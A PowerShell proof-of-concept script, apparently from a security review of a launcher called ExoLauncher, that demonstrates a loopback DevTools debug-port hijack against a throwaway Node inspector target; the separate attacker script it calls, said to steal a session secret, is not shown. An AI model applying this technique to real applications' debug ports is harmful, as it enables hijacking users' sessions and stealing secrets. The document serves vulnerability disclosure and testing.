# Attack 1 — loopback DevTools port hijack, against a THROWAWAY victim.
#
# Mirrors how ExoLauncher starts Spotify (Helpers/SpotifyControls.cs):
#   - a free loopback port picked once (SpotifyControls.PickLoopbackPort binds
#     TcpListener(IPAddress.Loopback, 0)),
#   - --remote-debugging-port=<port> with NO --remote-allow-origins,
#   - no auth token on the endpoint.
# A SEPARATE process (cdp_attacker.mjs), standing in for any same-user local
# program, is then handed ONLY the port and steals the session secret.
#
# No standalone Chromium browser is installed here, so an isolated Node process
# (V8 Inspector == Chrome DevTools Protocol; Runtime.evaluate is the same
# primitive) is used as the throwaway target. Never touches the user's real
# Spotify/Discord/Exo.
#
# Exit 0 = PROVEN VULNERABLE.
$ErrorActionPreference = 'Stop'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$node = (Get-Command node -ErrorAction SilentlyContinue).Source
if (-not $node) { Write-Host 'NOT PROVEN: node unavailable.'; exit 3 }

function Pick-LoopbackPort {
    $l = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Loopback, 0)
    $l.Start(); $p = ([System.Net.IPEndPoint]$l.LocalEndpoint).Port; $l.Stop()
    return $p
}

$port = Pick-LoopbackPort
Write-Host "Loopback port picked (random :0 bind, as SpotifyControls does): $port"

# Start the throwaway victim with a loopback DevTools/inspector port, exactly
# the shape of SpotifyControls.DebugArgument ("--remote-debugging-port=<port>"
# bound to 127.0.0.1, no --remote-allow-origins).
$victimOut = Join-Path $env:TEMP ("exo-attack1-victim-" + [guid]::NewGuid().ToString('N') + '.log')
$proc = Start-Process -FilePath $node `
    -ArgumentList @("--inspect=127.0.0.1:$port", (Join-Path $here 'victim.mjs')) `
    -PassThru -WindowStyle Hidden -RedirectStandardError $victimOut

# Poll /json until the debug endpoint answers (same endpoint SpotifyControls polls).
$endpoint = "http://127.0.0.1:$port/json"
$up = $false
for ($i = 0; $i -lt 40; $i++) {
    Start-Sleep -Milliseconds 250
    try {
        $r = Invoke-WebRequest -UseBasicParsing -Uri $endpoint -TimeoutSec 2
        if ($r.StatusCode -eq 200 -and $r.Content -match 'webSocketDebuggerUrl') { $up = $true; break }
    } catch {}
}

$ok = 1
if (-not $up) {
    Write-Host 'NOT PROVEN: throwaway debug endpoint never came up.'
    $ok = 3
} else {
    Write-Host "DevTools endpoint LIVE on 127.0.0.1:$port (no auth requested by the server)."
    Write-Host '--- attacker (separate process, given only the port) ---'
    & $node (Join-Path $here 'cdp_attacker.mjs') $port
    $ok = $LASTEXITCODE
}

try { if ($proc -and -not $proc.HasExited) { Stop-Process -Id $proc.Id -Force } } catch {}
try { Remove-Item -Force $victimOut -ErrorAction SilentlyContinue } catch {}

if ($ok -eq 0) { Write-Host 'RESULT: PROVEN-VULNERABLE — any same-user local process can drive the loopback debug port.' }
elseif ($ok -eq 3) { Write-Host 'RESULT: NOT PROVEN (environment).' }
else { Write-Host 'RESULT: attacker did not complete; see output.' }
exit $ok
